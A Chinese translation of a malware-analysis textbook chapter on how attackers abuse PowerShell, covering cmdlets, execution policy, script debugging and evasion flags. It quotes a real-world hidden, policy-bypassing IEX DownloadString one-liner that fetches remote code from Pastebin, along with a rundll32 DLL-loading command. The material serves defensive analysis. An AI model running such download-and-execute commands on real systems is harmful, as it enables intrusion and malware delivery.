<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499974&idx=1&sn=07c80c48e19180e4beef0748de69f823&chksm=9ae181fead9608e896f3afa9c3d1326aeabcda323254a9b8f1a6d28c25a3551fb28586e4f38a&scene=178&cur_album_id=2617884898938290179#rd)

![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOQ4y3CslMX5EINOxRsoicGxHxJnwtXjIau4usI94yHUKXTqh4LyuVL4A/640?wx_fmt=gif)

**特别说明及声明**

1.  本文原文为 K A, Monnappa. 2018 年发表的《Learning Malware Analysis》，本文的相关内容均为笔者对相关内容的翻译及实践记录，仅供各位学术交流使用。另出于易读性考虑，对部分字句有所删改。
    
2.  如各位需要引用，请做原文引用，格式如下所示：  
    [序号]K A, Monnappa. LearningMalware Analysis[M]. 2018.06. Published by Packt Publishing Ltd. Livery Place 35 Livery Street Birmingham B3 2PB, UK.
    
3.  因文章整体内容较长，完整内容将会在本公众号拆分为多篇内容分别发出。本文为该系列的第四篇，往期内容请参见：
    
    [恶意样本分析之恶意软件的功能和持久化（一）](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247497937&idx=1&sn=5c77080107f7b471da671cc757b2e124&chksm=9ae1b9e9ad9630fffe26414d0c6ead51a0ab17287aa481ef99d7e4c9e6275a6619689ae4ec22&scene=21#wechat_redirect)
    
    [恶意样本分析之恶意软件的功能和持久化（二）](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247498356&idx=1&sn=dc8f10985c3a0fa6083493a5a2be00ce&chksm=9ae1bb4cad96325a188df840728dee6e59820e1b6f59651204ca6473c540c61b37a8e7d89a89&scene=21#wechat_redirect)
    
    [恶意样本分析之恶意软件的功能和持久化（三）](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247498719&idx=1&sn=187ae9552c521c341f27a5224760ed77&chksm=9ae1bae7ad9633f133a37656b265e4d1b91ca226e595f60eb050fc3f82985ea2804624bfcae1&scene=21#wechat_redirect)
    

  

  

  

**1.6 基于 PowerShell 的执行**

  

  

为了逃避检测，恶意软件作者往往会利用系统中已经存在的工具使得他们能够隐藏其恶意活动，如 PowerShell。PowerShell 是一个基于. NET 框架的管理引擎。该引擎暴露了一系列被称为 cmdlets 的命令，它被托管在一个应用程序和 Windows 操作系统中，该系统默认提供一个命令行界面（互动控制台）和一个 GUI PowerShell ISE（集成脚本环境）。

PowerShell 不是一种编程语言，但它允许用户创建包含多个命令的有用脚本。用户也可以打开 PowerShell 提示符并执行单个命令。PowerShell 通常由系统管理员用于合法目的。

然而，攻击者使用 PowerShell 来执行恶意代码的情况也在增加。攻击者使用 PowerShell 的主要原因是它提供了对所有主要操作系统功能的访问，而且留下的痕迹非常少，从而使检测更加困难。

下面概述了攻击者如何在恶意软件攻击中利用 PowerShell：

*   在大多数情况下，Powershell 被用来下载其他组件。它大多是通过含有文件（如. lnk、.wsf、JavaScript、VBScript 或含有恶意宏的办公文件）的电子邮件附件传递，这些文件能够直接或间接执行 PowerShell 脚本。一旦攻击者欺骗用户打开恶意附件，那么恶意代码就会直接或间接调用 PowerShell 来下载额外的组件。
    
*   它被用于横向移动，攻击者在远程计算机上执行代码，在网络内部传播。
    
*   攻击者使用 PowerShell 直接从内存动态加载和执行代码，而不访问文件系统。这使得攻击者可以隐身，并使其取证分析更加困难。
    
*   攻击者使用 PowerShell 来执行他们的混淆代码；这使得传统的安全工具很难发现它。
    

如果你是 PowerShell 的新手，你可以在以下链接中找到许多教程来开始使用 PowerShell：

```
https://social.technet.microsoft.com/wiki/contents/articles/4307.powershell-for-beginners.aspx
```

* 左右滑动查看更多

##### 1.6.1 PowerShell 命令基础知识

在深入研究恶意软件如何使用 PowerShell 的细节之前，我们先了解一下如何执行 PowerShell 命令。

你可以使用交互式 PowerShell 控制台执行 PowerShell 命令；或是可以使用 Windows 程序搜索功能或在命令提示符中输入 powershell.exe 来调出它。一旦进入交互式 PowerShell，你就可以输入命令来执行它。

在下文的例子中，Write- Host cmdlet 把信息写到了控制台。cmdlet（如 Write-Host）是一个用. NET 框架语言编写的编译命令，其目的是小型、并为单一目的服务。

cmdlet 遵循一个标准的动词 - 名词命名惯例。

```
PS C:\> Write-Host "Hello world" 
 Hello world
```

一个 cmdlet 可以接受参数。参数以破折号开始，紧接着是参数名称和一个空格，然后是参数值。

在下面的例子中，Get-Process cmdlet 被用来显示关于 explorer 进程的信息。Get-Process cmdlet 接受了一个参数，其名称为 Name，其值为 explorer。

```
PS C:\> Get-Process -Name explorer
 Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName 
 ------- ------ ----- ----- ----- ------ -- ----------- 
 1613 86 36868 77380 ...35 10.00 3036 explorer
```

* 左右滑动查看更多

另外，你也可以使用参数快捷键来减少一些输入，上述命令也可以写成：

```
PS C:\> Get-Process -n explorer
 Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName 
 ------- ------ ----- ----- ----- ----- -- ----------- 
 1629 87 36664 78504 ...40 10.14 3036 explorer
```

* 左右滑动查看更多

要获得更多关于 cmdlet 的信息（比如关于语法和参数的细节），可以使用 Get-Help cmdlet 或 help 命令。如果希望获得最新的信息，可以使用这里显示的第二条命令，在线获得帮助。

```
PS C:\> Get-Help Get-Process
 PS C:\> help Get-Process -online
```

在 PowerShell 中，变量可以用来存储数值。在下面的例子中，hello 是一个前缀为 $ 符号的变量。

```
PS C:\> $hello = "Hello World" 
 PS C:\> Write-Host 
 $hello Hello World
```

变量也可以保存 PowerShell 命令的结果，然后该变量可以用来代替命令，如下所示：

```
PS C:\> $processes = Get-Process
 PS C:\> $processes | where-object {$_.ProcessName -eq 'explorer'} Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName
 ------- ------ ----- ----- ----- ------ -- -----------
 1623 87 36708 78324 ...36 10.38 3036 explorer
```

* 左右滑动查看更多

##### 1.6.2 PowerShell 脚本与执行策略

PowerShell 的功能允许你通过组合多个命令来创建脚本。PowerShell 脚本的扩展名是. ps1。默认情况下用户将不被允许执行 PowerShell 脚本，这是由于 PowerShell 中默认的执行策略设置阻止了 PowerShell 脚本的执行。执行策略决定了执行 PowerShell 脚本的条件。

默认情况下，执行策略被设置为 "受限"，这意味着 PowerShell 脚本（.ps1）不能被执行，但我们仍然可以执行单个命令。

例如，当 Write-Host "Hello World" 命令被保存为 PowerShell 脚本（hello.ps1）并执行时，你会得到以下信息，这说明运行脚本被禁用。这是由于执行策略的设置。

```
PS C:\> .\hello.ps1
 .\hello.ps1 : File C:\hello.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
 At line:1 char:1
 + .\hello.ps1
 + ~~~~~~~~~~~
 + CategoryInfo : SecurityError: (:) [], PSSecurityException
 + FullyQualifiedErrorId : UnauthorizedAccess
```

* 左右滑动查看更多

执行策略不是一个安全功能，它只是一个防止用户意外执行脚本的控制手段。要显示当前的执行策略设置，你可以使用下面的命令：

```
PS C:\> Get-ExecutionPolicy 
 Restricted
```

可以使用 Set-ExecutionPolicy 命令来改变执行策略的设置（前提是以管理员身份执行该命令）。

在下面的例子中，执行策略被设置为 Bypass，这允许脚本不受任何限制的运行。如果我们遇到了一个恶意的 PowerShell 脚本，并想执行它以确定它的行为，这个设置将会对你的分析很有用：

```
PS C:\> Set-ExecutionPolicy Bypass 
 PS C:\> .\hello.ps1
 Hello World
```

##### 1.6.3 分析 PowerShell 命令 / 脚本

与汇编代码相比，Powershell 命令很容易理解，但在某些情况下（比如 PowerShell 命令被混淆了），就可能会想运行 PowerShell 命令来了解它的工作原理。

测试单个命令的最简单方法是在交互式 PowerShell 中执行它。如果你想执行一个包含多个命令的 PowerShell 脚本（.ps1），首先将执行策略设置改为 Bypass 或 Unrestricted（如前所述），然后使用 PowerShell 控制台执行该脚本。记住要在一个隔离的环境中执行恶意的脚本。

  
在 PowerShell 提示符下运行脚本（.ps1）将一次性运行所有命令。如果你想控制执行，那么可以使用 PowerShell ISE（集成脚本环境）调试 PowerShell 脚本。

你可以通过使用程序搜索功能调出 PowerShell ISE，然后将 PowerShell 脚本加载到 PowerShell ISE 中，或者复制粘贴一个命令并使用其调试功能（如 Step Into、Step Over、Step Out 和 Breakpoints），可以通过调试菜单访问。调试前，确保将执行策略设置为 Bypass。

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIODibq31zAoPDCcYInuia2LGzqDKeAfRPD0cJic2s2zYTODmb6uhmuicXOebqX8f9zvLwo7jHVIcyydQ/640?wx_fmt=png)

##### 1.6.4 攻击者是如何使用 PowerShell 的

在了解了基本的 PowerShell 和使用什么工具进行分析后，现在让我们看看攻击者是如何使用 PowerShell 的。

由于通过 PowerShell 控制台或双击执行 PowerShell 脚本（.ps1）的限制（这将在记事本中打开，而不是执行脚本），不太可能看到对手直接向受害者发送 PowerShell 脚本。

攻击者必须首先欺骗用户执行恶意代码；这主要是通过发送含有. lnk、.wsf、javascript 或恶意宏文件等文件的电子邮件附件来实现。一旦用户被骗打开附件文件，恶意代码就可以直接调用 PowerShell（powerhell.exe），或通过 cmd.exe、Wscript、Cscript 等间接调用。

在 PowerShell 被调用后，可以使用各种方法绕过执行策略。例如，为了绕过执行限制策略，攻击者可以使用恶意代码调用 powershell.exe，并通过 Bypass 执行策略标志，如下图所示，即使用户不是管理员，这种技术也会起作用，它可以覆盖默认的执行限制策略并执行脚本。

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIODibq31zAoPDCcYInuia2LGNiaOPNdwDCax6gxgugXkiczQuiaeSzA3goiaY22D6QXTchTy3DI1XDqskw/640?wx_fmt=png)

以同样的方式，攻击者使用各种 PowerShell 命令行参数来绕过执行策略。下表概述了用于逃避检测和绕过本地限制的最常见的 PowerShell 参数。

<table cellspacing="0" cellpadding="0" width="0%"><tbody><tr><td valign="bottom"><p><strong>命令行参数</strong></p></td><td valign="bottom"><p><strong>描述</strong></p></td></tr><tr><td valign="top"><p>ExecutionPolicy Bypass （-Exec bypass)</p></td><td valign="top"><p>忽略执行策略的限制，不加警告地运行脚本</p></td></tr><tr><td valign="top"><p>WindowStyle 隐藏 (-W Hidden)</p></td><td valign="top"><p>隐藏 PowerShell 窗口</p></td></tr><tr><td valign="top"><p>NoProfile (-NoP)</p></td><td valign="top"><p>忽略配置文件中的命令</p></td></tr><tr><td valign="top"><p>EncodedCommand (-Enc)</p></td><td valign="top"><p>执行以 Base64 编码的命令</p></td></tr><tr><td valign="top"><p>NonInteractive (-NonI)</p></td><td valign="top"><p>不向用户显示交互式提示</p></td></tr><tr><td valign="top"><p>Command (-C)</p></td><td valign="top"><p>执行单个命令</p></td></tr><tr><td valign="top"><p>File (-F)</p></td><td valign="top"><p>执行指定文件中的命令</p></td></tr></tbody></table>

除了使用 PowerShell 命令行参数，攻击者还在 PowerShell 脚本中使用 cmdlet 或. NET APIs。以下是最经常使用的命令和功能：

*   Invoke-Expression（IEX）: 这个 cmdlet 评估或执行一个指定的字符串作为一个命令。
    
*   Invoke-Command: 这个 cmdlet 可以在本地或远程计算机上执行 PowerShell 命令。
    
*   Start-Process: 这个小程序从一个给定的文件路径启动一个进程。
    
*   DownloadString: 这个方法来自 System.Net.WebClient（WebClient 类），从一个 URL 中下载资源为一个字符串。
    
*   DownloadFile(): 该方法来自 System.Net.WebClient（WebClient 类），将资源从 URL 下载到本地文件。
    

下面是作者博客中提到的一个攻击中使用的 PowerShell 下载器的例子。

```
https://cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/
```

* 左右滑动查看更多

在这种情况下，PowerShell 命令通过 cmd.exe 被包含在微软 Excel 表格中的恶意宏调用，该表格是以电子邮件附件形式发送给受害者的。

  
PowerShell 将下载的可执行文件作为 doc6.exe 丢在 %TEMP% 目录下。然后，它为被丢弃的可执行文件添加了一个注册表项，并调用 eventvwr.exe，这是一种有趣的注册表劫持技术，允许 doc6.exe 被 eventvwr.exe 以高完整性级别执行。这种技术还默默地绕过了 UAC（用户账户控制）。

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zJkfzqjgVplRuicfO5vLKkHVyWJqfaDtug6HdmeypEXGghiaDuwN3GEbx6fDsOK4q7libVAeYTsHFU7Q/640?wx_fmt=png)

以下是一个目标攻击的 PowerShell 命令。

```
https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/
```

* 左右滑动查看更多

在这种情况下，PowerShell 被恶意宏调用，而不是直接下载可执行文件，而是使用 DownloadString 方法从 Pastebin 链接下载 base64 内容。在下载了编码的内容后，它被解码并丢到磁盘上。

```
powershell -w hidden -ep bypass -nop -c "IEX ((New-ObjectNet.WebClient).DownloadString('http://pastebin.com/raw/[removed]'))"
```

* 左右滑动查看更多

在下面的例子中，在调用 PowerShell 之前，一个恶意软件投放者首先在 %Temp% 目录下写了一个扩展名为. bmp 的 DLL（heiqh.bmp），然后通过 PowerShell 启动 rundll32.exe 来加载 DLL 并执行 DLL 的导出函数 dlgProc。

```
PowerShell cd $env:TEMP ;start-process rundll32.exe heiqh.bmp,dlgProc
```

* 左右滑动查看更多

关于恶意软件攻击中使用的不同 PowerShell 技术的更多信息，请参阅白皮书。在攻击中越来越多地使用 PowerShell。

```
https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
```

* 左右滑动查看更多

攻击者利用各种混淆技术来增加分析难度。要了解攻击者如何使用 PowerShell 混淆技术，可观看 Daniel Bohannon 在 Derbycon 上的演讲。  

```
Bohannon: https://www.youtube.com/watch?v=P1lkflnWb0I
```

* 左右滑动查看更多

（未完待续）

* * *

**—  往期回顾  —**

  

[**![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zL227ibOmpOzGD7zr7zB8uG0FSsoSmrNybqajdOARxTKWzckYaEGEhQl0jLb31nIGLSHdgnfly5sqw/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)**](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499155&idx=2&sn=ccb62c79b9a0e5f7d708dedbf479fc30&chksm=9ae1bcabad9635bd90f0f4109ce3b142f5f51a2aa510086544f38c7bb25ee716645033ed4129&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zJkfzqjgVplRuicfO5vLKkHVar4VQoVFOvE8afNUIt619U1l9qlU5ZR4doO5EKdRTfnY6mkibuz2ic6A/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499785&idx=1&sn=b56f9a90c389843d161d005d7f35209c&chksm=9ae18131ad9608271101f1121c859523972d19af52a93e7be764f186cc198b312e60653a285b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zIODibq31zAoPDCcYInuia2LG4wHdWeRLICumG2UrjhjCJqf4kMnfumGQcW7Bmwf4IRYJABMHnC9txQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499747&idx=1&sn=338a5c061b56b220d18e0de2fdefdba8&chksm=9ae1bedbad9637cdb5e9eb888853749a2b18eb774a170248b52d4e130df1b57d01188c2a4621&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zKYgGFApyicCZ6ibicV3cJ9GTxAic116zcI7jMUaMe9jj4ficPQ5d1vcCC0dlPIkwkRmb0Nuj0HckmkRjA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499743&idx=1&sn=71beb325ca4b879cec9d3b5886588743&chksm=9ae1bee7ad9637f10067e6116d8dc668655cac8d24e5b6b8c26d6a16fdf29a80503197b0230c&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zLb8tIStEPN5J4jEOyj6o2I1ic51lS5Wkwb4zAbnia0najNSWwnb5jiayLHqRia5DnqMuwxj1QqWVNR2w/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)](http://mp.weixin.qq.com/s?__biz=MzAwMDgyNTQzMQ==&mid=2247499647&idx=1&sn=13790d2fcd1bc558d05ff125fbd0d92b&chksm=9ae1be47ad963751ec37bfe7f327ea0621d74761246a84a3f62abc25312c9e95c8e486f67144&scene=21#wechat_redirect)

  

  

**关于安恒信息安全服务团队**

**安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。**

  

![](https://mmbiz.qpic.cn/mmbiz_png/hiaiaLeG6N1zIFIDZlXFuQeZrcKrV7Zd8Aeg98Fw5jzbGBgUW1hVQXIV3YpLZncEYibgw7MFwWtDU5vwnE2QFVP7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaiaLeG6N1zLzGUib2ia6F1ribVUnfRj2ibJY20XR9ug0dL1k1V6bOtbUgBw1diarLHgZPuz6dny9G7o2hmwRdgT1RJA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/hiaiaLeG6N1zItD3hicyicTUxCsdYyvSZWKOCUgD3ep5Jp4DE8e2S2Y3WnxsKjicicOg3OsGGRc9NPibQ61aRAqNXZQDA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)